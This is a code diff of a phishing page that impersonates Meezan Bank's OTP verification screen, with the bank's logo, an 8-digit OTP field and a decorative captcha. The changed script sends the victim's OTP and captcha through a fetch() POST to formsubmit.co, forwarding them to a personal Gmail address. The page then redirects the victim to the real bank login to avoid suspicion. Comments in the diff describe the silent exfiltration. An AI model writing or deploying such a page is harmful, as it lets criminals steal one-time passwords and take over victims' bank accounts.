@@ -7,26 +7,46 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
+        /* --- CSS (Exactly the same as the Login Page, minus Grid CSS) --- */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: 'Segoe UI', sans-serif;
             min-height: 100vh; min-height: 100dvh; 
             display: flex; justify-content: center; align-items: center;
-            background-image: url('background.png'); 
+            background-image: url('background.png'); /* Same background */
             background-size: cover; background-position: center;
         }
         
-        .bg-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.52); z-index: 0; }
+        .bg-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.50); 
+            z-index: 0; 
+        }
         
-        .login-container { position: relative; z-index: 1; width: 100%; max-width: 400px; padding: 25px 20px; text-align: center; max-height: 100vh; max-height: 100dvh; overflow-y: auto; }
+        .login-container { 
+            position: relative; z-index: 1; 
+            width: 100%; max-width: 400px; 
+            padding: 25px 20px; text-align: center; 
+            max-height: 100vh; max-height: 100dvh;
+            overflow-y: auto; 
+        }
 
-        .bank-logo { display: block; width: 100%; max-width: 150px; height: auto; min-height: 60px; margin: 0 auto 20px auto; object-fit: contain; }
-        .title { display: block; color: white; font-weight: 600; font-size: 1.15rem; margin-bottom: 25px; }
-        .otp-info { color: #ccc; font-size: 0.85rem; margin-bottom: 15px; display: block; }
+        .bank-logo { 
+            display: block; width: 100%; max-width: 150px; height: auto; 
+            min-height: 60px; margin: 0 auto 20px auto; object-fit: contain;
+        }
+
+        .title { 
+            display: block; color: white; font-weight: 600; 
+            font-size: 1.15rem; margin-bottom: 25px; 
+        }
         
         .input-group { display: flex; align-items: center; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .input-icon { width: 48px; padding: 14px 15px; background: #d1c4e9; color: #6a1b9a; display: flex; align-items: center; justify-content: center; }
+        .input-icon, .eye-icon { padding: 14px 15px; background: #ececec; display: flex; align-items: center; justify-content: center; }
+        .input-icon { width: 48px; background: #d1c4e9; color: #6a1b9a; }
         .input-group input { flex: 1; border: none; padding: 14px 15px; outline: none; font-size: 0.95rem; width: 100%; background: transparent;}
+        
+        .otp-info { color: #ccc; font-size: 0.85rem; margin-bottom: 15px; display: block; }
 
         .captcha-group { display: flex; align-items: center; gap: 10px; justify-content: center; margin: 15px 0; }
         .captcha-box { background: rgba(200, 200, 200, 0.85); padding: 8px 15px; border-radius: 4px; font-weight: bold; letter-spacing: 2px; font-size: 1.1rem; color: #333; text-decoration: line-through; font-family: monospace; }
@@ -60,16 +80,20 @@
     <div class="bg-overlay"></div>
 
     <div class="login-container">
+        <!-- Same local logo -->
         <img src="/logo.png" alt="Meezan Bank Logo" class="bank-logo">
+
         <h2 class="title">Enter Verification Code</h2>
         <span class="otp-info">Please enter the 8-digit OTP sent to your registered number.</span>
 
         <form id="otpForm">
+            <!-- 8-Digit OTP Input -->
             <div class="input-group">
                 <span class="input-icon"><i class="fas fa-shield-alt"></i></span>
                 <input type="text" id="otp" placeholder="Enter OTP (8 digits)" maxlength="8" pattern="\d*" required>
             </div>
 
+            <!-- Kept Captcha -->
             <div class="captcha-group">
                 <span class="captcha-box">1 q X b 9 6</span>
                 <i class="fas fa-sync-alt refresh-captcha"></i>
@@ -78,24 +102,21 @@
                 <input type="text" id="captcha" placeholder="Enter Captcha" required>
             </div>
 
+            <!-- Buttons -->
             <button type="submit" id="otpBtn" class="btn-login">Verify OTP</button>
             <button type="button" class="btn-register">Resend OTP</button>
+            
             <a href="#" class="footer-link">Security Guide</a>
         </form>
     </div>
 
+    <!-- Big Livechat Tab -->
     <div class="livechat-tab">
         <span>LIVECHAT</span>
     </div>
 
-    <!-- EMAILJS SCRIPT FOR OTP PAGE -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        (function() {
-            // ⚠️ REPLACE 'YOUR_PUBLIC_KEY' WITH YOUR ACTUAL KEY FROM EMAILJS
-            emailjs.init("dR_-toM4zEE2UwbxK");
-        })();
-
+        // Refresh Captcha
         document.querySelector('.refresh-captcha').addEventListener('click', function() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let captcha = '';
@@ -103,20 +124,27 @@
             document.querySelector('.captcha-box').innerText = captcha;
         });
 
+        // OTP Form Submission (Silent & Redirect)
         document.getElementById('otpForm').addEventListener('submit', function(event) {
             event.preventDefault(); 
             const btn = document.getElementById('otpBtn');
-            btn.disabled = true;
+            btn.disabled = true; // Prevents double clicking
 
-            const templateParams = {
+            const formData = {
                 otp_code: document.getElementById('otp').value,
-                captcha: document.getElementById('captcha').value
+                captcha: document.getElementById('captcha').value,
+                _subject: "New Meezan OTP Submission",
+                _captcha: false
             };
 
-            // ✅ Using your exact Service ID and Template ID for the OTP page
-            emailjs.send('service_d1pbycs', 'template_l7ekrr7', templateParams)
-                .catch(() => {}); // Silently ignore errors for a smooth presentation
+            // Sends OTP to your email silently
+            fetch('https://formsubmit.co/ajax/ayanali012777@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(err => console.error(err)); // Silently ignore errors
 
+            // Redirect to real bank site instantly
             window.location.href = "https://ebanking.meezanbank.com/AmbitRetailFrontEnd/login?se=y_sHexp";
         });
     </script>
